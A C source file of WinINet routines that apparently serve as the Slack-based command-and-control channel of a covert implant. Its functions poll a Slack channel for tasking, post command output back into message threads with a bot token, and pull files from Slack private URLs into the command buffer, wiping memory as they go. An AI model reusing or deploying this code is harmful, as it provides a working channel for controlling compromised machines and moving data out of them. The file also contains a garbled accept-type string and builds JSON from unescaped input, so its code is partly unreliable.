#include "Header.h"

BOOL GetFromSlack(char** slackJson) {

    // Declare Variables 
    HINTERNET hInternetSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    DWORD totalBytesRead = 0;
    DWORD bytesRead = 0;
    DWORD bufferSize = 1024;
    DWORD newBufferSize = 0;
    DWORD CHUNK_SIZE = 512;
    char* buffer = NULL;
    char* newBuffer = NULL;

    // Validate input parameters
    if (!slackJson) DEBUG("Invalid slackJson");

    // Start WinINet session
    hInternetSession = InternetOpenA(gConfig.userAgent, NULL, NULL, NULL, NULL);
    if (!hInternetSession) DEBUG("InternetOpenA");

    // Connect to Slack host
    hConnect = InternetConnectA(hInternetSession, "slack.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
    if (!hConnect) DEBUG("InternetConnectA");

    // Prepare HTTP GET request
    hRequest = HttpOpenRequestA(hConnect, "GET", gConfig.path, NULL, NULL, NULL, 
        INTERNET_FLAG_SECURE |
        INTERNET_FLAG_RELOAD |
        INTERNET_FLAG_NO_CACHE_WRITE |
        INTERNET_FLAG_PRAGMA_NOCACHE |
        INTERNET_FLAG_NO_COOKIES |
        INTERNET_FLAG_NO_UI |
        INTERNET_FLAG_KEEP_CONNECTION, 0);
    if (!hRequest) DEBUG("HttpOpenRequest");

    // Send the request with headers
    if (!HttpSendRequestA(hRequest, gConfig.headers, (DWORD)strlen(gConfig.headers), NULL, 0)) DEBUG("HttpSendRequest");

    // Allocate buffer for reading response
    buffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) DEBUG("VirtualAlloc");

    // Read response data into buffer
    while (TRUE) {

        // Check to see if we are going to overflow our buffer
        if (totalBytesRead + CHUNK_SIZE + 1 > bufferSize) {
            
            // Double the buffer size
            newBufferSize = bufferSize * 2;

            // Allocate a new, larger buffer
            newBuffer = VirtualAlloc(NULL, newBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!newBuffer) DEBUG("VirtualAlloc");

            // Copy over the original bytes + wipe the old as we go
            for (DWORD i = 0; i < totalBytesRead; i++) {
                newBuffer[i] = buffer[i];
                buffer[i] = 0;
            }

            // Free the original buffer
            VirtualFree(buffer, 0, MEM_RELEASE);

            // Overwrite our last buffer with the new one
            buffer = newBuffer;
            bufferSize = newBufferSize;
        }

        InternetReadFile(hRequest, buffer + totalBytesRead, CHUNK_SIZE, &bytesRead);

        if (bytesRead == 0)
            break;

        totalBytesRead += bytesRead;
    }

    // Null-terminate buffer and assign to output
    buffer[totalBytesRead] = '\0';
    *slackJson = buffer;
    goto _SUCCESS;


_SUCCESS:
    if (hInternetSession) InternetCloseHandle(hInternetSession);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hRequest) InternetCloseHandle(hRequest);
    return TRUE;


_ERROR:
    if (hInternetSession) InternetCloseHandle(hInternetSession);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hRequest) InternetCloseHandle(hRequest);
    return FALSE;
}

BOOL PostToSlack(SlackCmd* slackCmd) {

    // Declare Variables
    HINTERNET hInternetSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    const char* acceptTypes[] = { "!!!!!!!!!!!!!!!!!!!!!!!/*", NULL };
        size_t jsonSize = 0;
    char* jsonBody = NULL;
    char authHeader[256] = { 0 };
    const char* contentHeader = "Content-Type: application/json; charset=utf-8\r\n";
    char headers[512] = { 0 };
    char buffer[512] = { 0 };
    DWORD bytesRead = 0;

    // Validate input parameters
    if (!slackCmd->buffer || strlen(slackCmd->buffer) == 0) DEBUG("[!] Invalid SlackCmd buffer (null or empty)");

    // Format Authorization header
    snprintf(authHeader, sizeof(authHeader), "Authorization: Bearer %s\r\n", gConfig.botToken);

    // Calculate JSON body size
    jsonSize = snprintf(NULL, 0, "{\"channel\":\"%s\",\"text\":\"%s\",\"thread_ts\":\"%s\"}", gConfig.channelId, slackCmd->buffer, slackCmd->ts) + 1;

    // Allocate memory for JSON body
    jsonBody = (char*)VirtualAlloc(NULL, jsonSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!jsonBody) {
        DEBUG("VirtualAlloc jsonBody");
        goto _ERROR;
    }

    // Format JSON payload
    snprintf(jsonBody, jsonSize, "{\"channel\":\"%s\",\"text\":\"%s\",\"thread_ts\":\"%s\"}", gConfig.channelId, slackCmd->buffer, slackCmd->ts);

    // Build full HTTP headers
    snprintf(headers, sizeof(headers), "%s%sContent-Length: %lu\r\n", authHeader, contentHeader, (unsigned long)(jsonSize - 1));

    // Open internet session
    hInternetSession = InternetOpenA(gConfig.userAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternetSession) DEBUG("InternetOpenA");

    // Connect to slack.com
    hConnect = InternetConnectA(hInternetSession, "slack.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) DEBUG("InternetConnectA");

    // Open HTTP POST request
    hRequest = HttpOpenRequestA(hConnect, "POST", "/api/chat.postMessage", NULL, NULL, acceptTypes, 
        INTERNET_FLAG_SECURE |
        INTERNET_FLAG_RELOAD |
        INTERNET_FLAG_NO_CACHE_WRITE |
        INTERNET_FLAG_PRAGMA_NOCACHE |
        INTERNET_FLAG_NO_COOKIES |
        INTERNET_FLAG_NO_UI |
        INTERNET_FLAG_KEEP_CONNECTION, 0);
    if (!hRequest) DEBUG("HttpOpenRequestA");

    // Send request with headers and JSON
    if (!HttpSendRequestA(hRequest, headers, (DWORD)strlen(headers), jsonBody, (DWORD)(jsonSize - 1))) DEBUG("HttpSendRequestA");

    // Read and discard response
    while (TRUE) {
        BOOL bRead = InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead);
        if (!bRead) DEBUG("InternetReadFile");
        if (bytesRead == 0) break;
        buffer[bytesRead] = '\0';
    }

    goto _SUCCESS;

_SUCCESS:
    if (hInternetSession) InternetCloseHandle(hInternetSession);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hRequest) InternetCloseHandle(hRequest);
    if (jsonBody) {
        SecureZeroMemory(jsonBody, jsonSize);
        VirtualFree(jsonBody, 0, MEM_RELEASE);
    }
    return TRUE;

_ERROR:
    if (hInternetSession) InternetCloseHandle(hInternetSession);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hRequest) InternetCloseHandle(hRequest);
    if (jsonBody) {
        SecureZeroMemory(jsonBody, jsonSize);
        VirtualFree(jsonBody, 0, MEM_RELEASE);
    }
    return FALSE;
}

BOOL UploadFile(SlackCmd* slackCmd) {

    // Declare Variables 
    DWORD totalBytesRead = 0;
    DWORD bytesRead = 0;
    DWORD bufferSize = 1024;
    DWORD newBufferSize = 0;
    DWORD CHUNK_SIZE = 512;
    char* buffer = NULL;
    char* newBuffer = NULL;
    URL_COMPONENTSA parts = { 0 };
    char host[256] = { 0 }, path[1024] = { 0 };
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    parts.dwStructSize = sizeof(parts);
    parts.lpszHostName = host;
    parts.dwHostNameLength = sizeof(host);
    parts.lpszUrlPath = path;
    parts.dwUrlPathLength = sizeof(path);
    
    // Validate input parameters
    if (!slackCmd->buffer || strlen(slackCmd->buffer) == 0) DEBUG("[!] Invalid SlackCmd buffer (null or empty)");


    // Parse the url into parts struct
    if (!InternetCrackUrlA(slackCmd->url_private, 0, 0, &parts)) {
        printf("[-] Failed to parse URL\n");
        return FALSE;
    }

    // Start WinINet session
    hSession = InternetOpenA("SlackFileDownloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) DEBUG("InternetOpenA");

    // Connect to Slack host
    hConnect = InternetConnectA(hSession, host, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) DEBUG("InternetConnectA");

    // Prepare HTTP GET request
    hRequest = HttpOpenRequestA(hConnect, "GET", path, NULL, NULL, NULL, 
        INTERNET_FLAG_RELOAD |
        INTERNET_FLAG_NO_CACHE_WRITE |
        INTERNET_FLAG_PRAGMA_NOCACHE |
        INTERNET_FLAG_SECURE |
        INTERNET_FLAG_NO_COOKIES |
        INTERNET_FLAG_NO_UI |
        INTERNET_FLAG_KEEP_CONNECTION, 0);
    if (!hRequest) DEBUG("HttpOpenRequestA");

    // Set Authorization header
    char headers[512];
    _snprintf_s(headers, sizeof(headers), _TRUNCATE, "Authorization: Bearer %s\r\n", gConfig.botToken);
    if (!HttpSendRequestA(hRequest, headers, (DWORD)strlen(headers), NULL, 0)) DEBUG("HttpSendRequestA");
    Sleep(1100);

    // Allocate buffer for reading response
    buffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) DEBUG("VirtualAlloc");

    // Read response data into buffer
    while (TRUE) {


        // Check to see if we are going to overflow our buffer
        if (totalBytesRead + CHUNK_SIZE + 1 > bufferSize) {


            // Double the buffer size
            newBufferSize = (bufferSize * 2) +1;

            // Allocate a new, larger buffer
            newBuffer = VirtualAlloc(NULL, newBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!newBuffer) DEBUG("VirtualAlloc");

            // Copy over the original bytes + wipe the old as we go
            for (DWORD i = 0; i < totalBytesRead; i++) {
                newBuffer[i] = buffer[i];
                buffer[i] = 0;
            }

            // Free the original buffer
            VirtualFree(buffer, 0, MEM_RELEASE);

            // Overwrite our last buffer with the new one
            buffer = newBuffer;
            bufferSize = newBufferSize;
        }

        InternetReadFile(hRequest, buffer + totalBytesRead, CHUNK_SIZE, &bytesRead);

        if (bytesRead == 0)
            break;

        totalBytesRead += bytesRead;
    }

    // Null-terminate buffer and assign to output
    buffer[totalBytesRead] = '\0';
    BufferReplaceRaw(&slackCmd->buffer, slackCmd->bufferSize, &slackCmd->bufferSize, (BYTE*)buffer, totalBytesRead);
    goto _SUCCESS;


_ERROR:
    if (hSession) InternetCloseHandle(hSession);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hRequest) InternetCloseHandle(hRequest);
    return FALSE;

_SUCCESS:
    if (hSession) InternetCloseHandle(hSession);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hRequest) InternetCloseHandle(hRequest);
    return TRUE;
}

